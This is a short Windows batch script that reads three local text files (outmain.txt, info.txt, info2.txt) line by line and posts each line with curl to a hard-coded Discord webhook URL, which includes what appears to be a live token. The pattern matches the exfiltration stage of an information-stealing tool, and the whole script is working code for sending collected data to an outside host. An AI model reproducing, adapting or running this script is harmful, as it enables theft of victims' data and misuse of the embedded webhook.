@echo off
set webhook=https://discord.com/api/webhooks/1486988281576034395/bF8-rj-jt58347vWv_rObDHCszseNYaG_luEsLx2NcffzUdmIQq80xrCVLbYaMuTzRo4
for /f "usebackq delims=" %%A in ("outmain.txt") do (
    curl -X POST -H "Content-type: application/json" --data "{\"content\": \"%%A\"}" %webhook%
)
for /f "usebackq delims=" %%A in ("info2.txt") do (
    curl -X POST -H "Content-type: application/json" --data "{\"content\": \"%%A\"}" %webhook%
)
for /f "usebackq delims=" %%A in ("info.txt") do (
    curl -X POST -H "Content-type: application/json" --data "{\"content\": \"%%A\"}" %webhook%
)
exit /b 0
